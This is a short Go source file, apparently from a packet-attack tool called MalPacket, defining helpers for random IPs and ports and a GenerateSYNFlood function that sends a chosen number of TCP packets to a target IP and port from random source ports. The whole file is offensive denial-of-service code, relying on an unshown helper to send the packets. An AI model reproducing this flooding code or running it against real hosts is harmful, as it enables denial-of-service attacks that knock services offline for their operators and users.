package malpacketatkmethods

import (
	"fmt"
	"math/rand"

	h "MalPacket/helper"
	"github.com/google/gopacket/pcap"
)

func generateRandomIP() string {
	return fmt.Sprintf("192.168.%d.%d", rand.Intn(255)+1, rand.Intn(255)+1)
}

func GenerateRandomPort() int {
	return rand.Intn(65535) + 1
}


/*
sending many packets in a short amount of time
*/
func GenerateSYNFlood(handle *pcap.Handle, srcIP, dstIP string, dstPort int, flood_amt int){
	payload := []byte{}
	for i := 0; i<flood_amt; i++{
		h.SendTCPPacket(handle, srcIP, dstIP, GenerateRandomPort(), dstPort, payload)
	}
}
